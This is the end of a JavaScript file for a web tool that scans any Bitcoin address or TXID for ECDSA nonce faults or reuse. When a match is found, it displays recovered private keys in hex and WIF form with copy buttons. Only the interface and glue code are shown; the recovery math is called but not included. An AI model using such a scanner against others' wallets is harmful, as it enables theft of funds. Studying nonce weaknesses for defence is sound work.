        let header = `<div class="result-header">CRYPTOGRAPHYTUBE<span class="tool-tag">Fault / Bit-Flip Recovery</span></div>`;
        if (elementId) {
            header += `
            <div class="download-tools">
                <button class="btn-small btn-txt" title="Export as TXT" onclick="exportOne('${elementId}', 'txt')">
                    <img src="../assets/svgs/solid/download.svg" width="12" height="12" alt=""> SAVE TXT
                </button>
            </div>`;
        }
        return header;
    }
    function exportOne(id, type) {
        const el = document.getElementById(id);
        if (!el || el.innerText.trim() === "" || el.innerText.includes("Waiting for input...") || el.innerText.length < 5) {
            alert("No results to export for this section yet.");
            return;
        }
        let rawText = el.innerText || el.textContent;
        let headerText = `CRYPTOGRAPHYTUBE REPORT\nTOOL: ECDSA FAULT / BIT-FLIP RECOVERY\nGENERATED: ${new Date().toLocaleString()}\n--------------------------------------------------\n\n`;
        const fullContent = headerText + rawText;
        if (type === 'txt') {
            const blob = new Blob([fullContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = `CryptographyTube_Report_${id}.txt`;
            document.body.appendChild(a); a.click(); document.body.removeChild(a);
        }
    }

    // ---- HTML helpers ----------------------------------------------------
    function escapeHtml(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }
    function copyBtn(text) {
        if (text == null || text === '') return '';
        return '<button type="button" class="rsz-copy" title="Copy" data-copy="' +
            escapeHtml(text) + '"><img src="../assets/svgs/regular/copy.svg" width="12" height="12" alt="copy"></button>';
    }
    function monoCell(val, extraCls) {
        return '<code class="rsz-val ' + (extraCls || '') + '">' + escapeHtml(val || '—') + '</code>' + copyBtn(val);
    }
    function rszLine(label, val, cls) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' + monoCell(val, cls) + '</div>';
    }
    function addrLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }
    function fallbackCopy(text, done) {
        try {
            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta); done();
        } catch (e) { }
    }
    document.addEventListener('click', function (ev) {
        const btn = ev.target && ev.target.closest ? ev.target.closest('.rsz-copy[data-copy]') : null;
        if (!btn) return;
        const val = btn.getAttribute('data-copy');
        const done = function () { btn.classList.add('copied'); setTimeout(function () { btn.classList.remove('copied'); }, 1200); };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(val).then(done).catch(function () { fallbackCopy(val, done); });
        } else { fallbackCopy(val, done); }
    });
    function spinner(size) {
        const n = size || 14;
        return '<img src="../assets/svgs/solid/spinner.svg" class="txr-spin" width="' + n + '" height="' + n + '" alt="loading">';
    }

    // ---- Rendering -------------------------------------------------------
    function recoveredKeyHtml(result, chain) {
        const info = chainInfo(chain);
        const pk = pubsFromPriv(BigInt('0x' + result.priv));
        let html = '<div class="rsz-vuln-box">';
        html += '<div class="rsz-vuln-title"><img src="../assets/svgs/solid/key.svg" width="15" height="15" alt=""> Recovered wallet · ' + escapeHtml(info.name) + '</div>';
        html += '<div class="rsz-vuln-key"><span class="key-label">PRIV (hex)</span><code class="rsz-val private-key">' + escapeHtml(result.priv) + '</code>' + copyBtn(result.priv) + '</div>';
        html += '<div class="rsz-vuln-key"><span class="key-label">WIF</span><code class="rsz-val private-key">' + escapeHtml(result.wif) + '</code>' + copyBtn(result.wif) + '</div>';
        if (result.k) html += '<div class="rsz-vuln-key"><span class="key-label">FAULTY k</span><code class="rsz-val rsz-nonce">' + escapeHtml(result.k) + '</code>' + copyBtn(result.k) + '</div>';
        html += rszLine('PUBKEY', result.pub);
        if (info.kind === 'p2pkh' || info.kind === 'zcash') {
            html += addrLine('Address (compressed)', addrFromPub(pk.cpub, info.version));
            html += addrLine('Address (uncompressed)', addrFromPub(pk.upub, info.version));
        } else {
            const addrs = chainAddresses(pk, chain);
            if (addrs.length) html += addrLine(info.name + ' address', addrs[0]);
        }
        html += '</div>';
        return html;
    }

    function renderResults(parsed, result, chain) {
        let html = '';
        html += '<div class="rsz-leak-box">';
        if (result) {
            html += '<div class="rsz-summary"><span class="rsz-chip rsz-chip-danger">Private key recovered</span>' +
                '<span class="rsz-chip">' + escapeHtml(result.mode) + '</span></div>';
            html += '<div class="rsz-leak-note"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                '<span>A fault in the nonce leaked the key. The recovered private key is <strong>verified</strong>' +
                (parsed.pub ? ' against the supplied public key' : ' by reproducing the signature&rsquo;s r from the implied nonce') +
                ' &mdash; it is mathematically certain, not a guess.</span></div>';
            html += '</div>';
            html += recoveredKeyHtml(result, chain);
        } else {
            html += '<div class="rsz-summary"><span class="rsz-chip rsz-chip-ok">No recovery</span></div>';
            html += '<div class="rsz-leak-note"><span>No fault relation matched these inputs. This method needs either ' +
                '<strong>two signatures from one key</strong> (a correct one and a faulty one differing by a single nonce bit, or sharing the same r), ' +
                'or a single signature with a <strong>known</strong> or <strong>collapsed (small)</strong> faulty nonce.</span></div>';
            html += '</div>';
        }
        if (parsed && parsed.sigs && parsed.sigs.length) {
            html += '<div class="rsz-thead"><div>Signature</div><div>R &middot; S &middot; Z</div><div>Role</div></div>';
            for (let i = 0; i < parsed.sigs.length; i++) {
                const g = parsed.sigs[i];
                const role = i === 0 ? 'reference / correct' : (i === 1 ? 'faulty' : 'extra');
                html += '<div class="rsz-row">';
                html += '<div class="rsz-col rsz-col-txid"><span class="key-label">SIG #' + (i + 1) + '</span></div>';
                html += '<div class="rsz-col rsz-col-rsz">' + rszLine('R', g.r) + rszLine('S', g.s) + rszLine('Z', g.z) + '</div>';
                html += '<div class="rsz-col rsz-col-addr"><div class="rsz-line"><span class="rsz-tag">ROLE</span><span class="rsz-chip">' + role + '</span></div></div>';
                html += '</div>';
            }
        }
        return html;
    }

    function renderScanResults(analysis, input, chain, totalSigs) {
        let html = '';
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + escapeHtml(chainInfo(chain).name) + '</span>';
        html += '<span class="rsz-chip">' + (totalSigs || 0) + ' signatures</span>';
        html += '<span class="rsz-chip">' + analysis.groups + ' signer(s)</span>';
        html += '<span class="rsz-chip">' + analysis.checked + ' pair(s) checked</span>';
        if (analysis.hit) html += '<span class="rsz-chip rsz-chip-danger">Weak key recovered</span>';
        else html += '<span class="rsz-chip rsz-chip-ok">No fault relation found</span>';
        html += '</div>';
        html += '<div class="rsz-line"><span class="rsz-tag">INPUT</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(input) + '</code>' + copyBtn(input) + '</div>';
        if (analysis.hit) {
            html += '<div class="rsz-leak-note"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                '<span>Recovered from an <strong>on-chain signature pair</strong> of one signer: ' + escapeHtml(analysis.hit.mode) + '. ' +
                'The key is verified by reproducing the signature&rsquo;s r from the implied nonce &mdash; not a guess.</span></div>';
            html += recoveredKeyHtml(analysis.hit, chain);
            if (analysis.pair) {
                html += '<div class="rsz-thead"><div>TXID</div><div>R &middot; S &middot; Z</div><div>Signer</div></div>';
                for (const g of analysis.pair) {
                    html += '<div class="rsz-row">';
                    html += '<div class="rsz-col rsz-col-txid"><span class="key-label">TXID</span>' + monoCell(g.txid || '—', 'rsz-txid') + '</div>';
                    html += '<div class="rsz-col rsz-col-rsz">' + rszLine('R', g.r) + rszLine('S', g.s) + rszLine('Z', g.z) + '</div>';
                    html += '<div class="rsz-col rsz-col-addr">' + addrLine('ADDR', g.addr) + '</div>';
                    html += '</div>';
                }
            }
        } else {
            html += '<div class="rsz-leak-note rsz-leak-ok">Scanned every signature pair per signer &mdash; no nonce reuse, single-bit ' +
                'nonce fault, or collapsed nonce was found in the scanned range. This method only recovers keys whose signer ' +
                'actually faulted or reused a nonce; a clean wallet yields nothing.</div>';
        }
        return html;
    }

    // ---- Entry points ----------------------------------------------------
    function activeChain() { return window.TXR_CHAIN || 'bitcoin'; }
    function readTxLimit() {
        const el = document.getElementById('txr-tx-limit');
        let want = el ? parseInt(el.value, 10) : 100;
        if (!want || want < 1) want = 100;
        return want;
    }

    // Scan an address / TXID: fetch on-chain signatures, then run fault analysis.
    async function processTxid() {
        const input = (document.getElementById('target_input') || {}).value;
        const out = document.getElementById('out_txid');
        if (!out) return;
        const header = getOutputHeader(out.id);
        const chain = activeChain();
        const addr = (input || '').trim();
        if (!addr) { out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Enter a Bitcoin address (or a 64-character TXID) to scan its on-chain signatures.</div>'; return; }
        if (chainInfo(chain).kind === 'ed25519') {
            out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                escapeHtml(chainInfo(chain).name) + ' uses Ed25519 — its transactions are not ECDSA r:s:z format. Switch to a secp256k1 chain (Bitcoin works best).</div>';
            return;
        }

        const want = readTxLimit();
        const setStatus = function (msg) { out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>'; };
        const onProgress = function (p) {
            if (p.phase === 'list') setStatus('Listing transactions… ' + p.listed + (p.target ? ' / ' + p.target : '') + ' found');
            else setStatus('Scanning transactions for signatures… ' + p.scanned + ' / ' + p.target + '  (signatures: ' + p.found + ')');
        };

        setStatus('Fetching on-chain signatures for ' + addr + '…');
        try {
            let sigs = [];
            if (addr.length === 64 && /^[0-9a-fA-F]+$/.test(addr)) {
                const raw = await getRawTx(addr);
                sigs = await getrsz(parseHexTransaction(raw), addr);
                sigs.forEach(function (e) { if (!e.txid) e.txid = addr.toLowerCase(); });
            } else if (addr.length >= 26) {
                sigs = await fetchAddressSignatures(addr, want, onProgress);
            } else {
                throw new Error("Invalid input. Paste a 64-character TXID or a Bitcoin address.");
            }

            setStatus('Running fault analysis over ' + sigs.length + ' signature(s)…');
            await new Promise(function (r) { setTimeout(r, 20); });
            const analysis = analyzeSignatures(sigs);
            out.innerHTML = header + renderScanResults(analysis, addr, chain, sigs.length);
        } catch (e) {
            out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Error: ' +
                escapeHtml(e.message) + '</div>';
        }
    }

    // Offline paste: r:s:z signatures from the textarea.
    async function processPaste() {
        const inputEl = document.getElementById('txid_input');
        const out = document.getElementById('out_txid');
        if (!inputEl) return;
        const input = inputEl.value.trim();
        const header = getOutputHeader(out.id);
        if (!input) {
            out.innerHTML = header + '<div class="rsz-status">Paste at least one signature as <code>r:s:z</code>.</div>';
            return;
        }
        out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' Running fault analysis…</div>';
        await new Promise(function (r) { setTimeout(r, 20); });
        try {
            const parsed = parseFaultInput(input);
            if (!parsed.sigs.length) {
                throw new Error("No signatures found. Enter each signature as r:s:z (hex), one per line.");
            }
            const result = runRecovery(parsed);
            out.innerHTML = header + renderResults(parsed, result, activeChain());
        } catch (e) {
            out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Error: ' +
                escapeHtml(e.message) + '</div>';
        }
    }

    window.processTxid = processTxid;
    window.processPaste = processPaste;
    window.exportOne = exportOne;
})();
